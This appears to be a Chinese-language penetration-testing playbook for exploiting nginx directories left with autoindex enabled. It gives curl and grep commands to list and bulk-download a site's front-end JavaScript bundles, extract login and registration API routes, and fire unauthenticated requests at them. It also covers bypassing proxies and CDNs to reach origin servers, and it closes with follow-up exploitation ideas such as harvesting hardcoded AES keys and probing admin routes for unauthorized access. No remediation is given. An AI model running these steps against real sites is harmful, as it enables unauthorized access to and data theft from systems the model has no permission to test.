# nginx autoindex 未关闭 → 双 SPA 前端全量构建产物匿名泄露

## 一句话
静态资源目录（`/static/js/`、`/static2/js/`）未关闭 `autoindex`，匿名即可列出并下载全部前端 chunk，
从而还原完整前端源码与后端 API 契约（含注册/登录/验证码的路径、字段与编码方式）。

## 前置条件
- 目标为「nginx（或同类）直接服务静态目录 + SPA 同域」架构，典型是单独的前端/中控子域：
  `console.<domain>` / `admin.<domain>` / `static.<domain>`。
- `/static/js/`、`/static2/js/`、`/assets/`、`/js/` 等目录存在且 `autoindex` 未关。
- 仅需 443 可达；无需任何账号、Cookie、Token。

## 复现步骤

### 1. 确认目录可列举
```
GET /static/js/ HTTP/1.1
Host: console.example.com
User-Agent: Mozilla/5.0
```
预期：
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<!doctype html>
<pre>
<a href="404.a745a66d.js">404.a745a66d.js</a>
<a href="app.646488a7.js">app.646488a7.js</a>
...
```
同一站点若还有第二套 SPA（顾客端 + 中控/管理端），第二套构建目录通常并列存在，例如 `/static2/js/`
（实测 125 项 / 170 项，含 `.js` 与 `.js.gz`）。

直连源站（纯 IP + 真实 Host，有代理时必须绕开）：
```bash
curl -k -sS --noproxy '*' -D - -H 'Host: console.example.com' 'https://<IP>/static/js/'
curl -k -sS --noproxy '*' -H  'Host: console.example.com'  'https://<IP>/static2/js/'
```

### 2. 批量下载 chunk
```bash
mkdir -p js && \
curl -k -sS --noproxy '*' -H 'Host: console.example.com' 'https://<IP>/static/js/' -o list.html && \
grep -o 'href="[^"]*\.js"' list.html | cut -d'"' -f2 | while read f; do
  curl -k -sS --noproxy '*' -H 'Host: console.example.com' "https://<IP>/static/js/$f" -o "js/$f"
done
# .gz 版本可直接 curl 后 gunzip，或跳过（同名 .js 已能取到）
```

### 3. 从 bundle 还原 API 契约
入口是 `app.*.js`（runtime + 公共 api 定义），业务逻辑在 `chunk-*.js`：
```bash
grep -oE '"[^"]*/(Verify|Login|Register|Captcha|List|Query|Detail|Order|Card)[^"]*"' js/*.js | sort -u
grep -oE '[a-zA-Z_]+:function\([a-z]*\)\{return [A-Za-z]+\([^)]*\)\}' js/app.*.js
grep -nE 'baseURL|axios\.create|transformRequest|qs\.stringify|URLSearchParams|X-Sign|X-Token' js/*.js | head
```
典型产出（实测形态）：
```js
register: function(e){ return On("/customer/Register/Verify", e) }
login:    function(e){ return On("/customer/Login/Verify", e) }
captcha:  function(e){ return On("/customer/Login/Captcha", e) }
```
同时确认请求编码（form-urlencoded 还是 JSON）、附加参数（如 `dots=x,y` 坐标拼接）、是否有前端签名/加密。

### 4. 接口落地探测
对抽出的路径逐个匿名请求（不带 Cookie / Authorization）：
```bash
curl -k -sS --noproxy '*' -H 'Host: console.example.com' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'phone=1&code=1' 'https://<IP>/customer/Login/Verify' -i
```
判据：返回业务 JSON（非 401/403/登录页）= 未授权命中；返回 401/403 则回 bundle 找鉴权头/签名逻辑复算。

## 判据
- 目录请求返回 `200` + `text/html; charset=utf-8` + `<pre><a href="...">` ⇒ autoindex 开启。
- 具体 chunk 匿名下载返回 `200` + `application/javascript` 且体积为真实构建产物（几十 KB ~ 数百 KB）。
- 只有以上两条同时成立才算泄露；单文件 200 但目录 403 属于正常静态服务，不算。

## 失败 / 误判原因
1. **代理改写回包**：本机有全局代理时 `requests` 要走 `trust_env=False`、`curl` 要 `--noproxy '*'`，否则拿到的是代理的错误页。
2. **Host 不对**：纯 IP 直连且不带真实 Host，会落到默认站点（宝塔「没有找到站点」页）或直接 404。
3. **CDN 前置**：边缘只按 Host/SNI 路由，需 `--resolve` 固定边缘 IP 或直接打源站 IP。
4. **目录名猜错**：`/static/js/`、`/static2/js/`、`/assets/`、`/js/`、`/dist/` 都要试；大小写敏感。
5. **autoindex off（403）**：别穷举目录，转去下 `/static/js/app.<hash>.js`（hash 从首页 HTML 抠）与 `.js.map`（sourcemap 往往同目录一起发布）。

## 后续利用方向
- 用完整接口清单做未授权/越权批量探测，比盲扫高效一个数量级。
- bundle 里的硬编码常量（AES key、盐值、第三方 AppID、内网域名、OSS bucket）直接是下一步突破口。
- 中控端（第二套 SPA）的 chunk 里常带管理接口路径与角色/权限字段名，可反推后台路由。
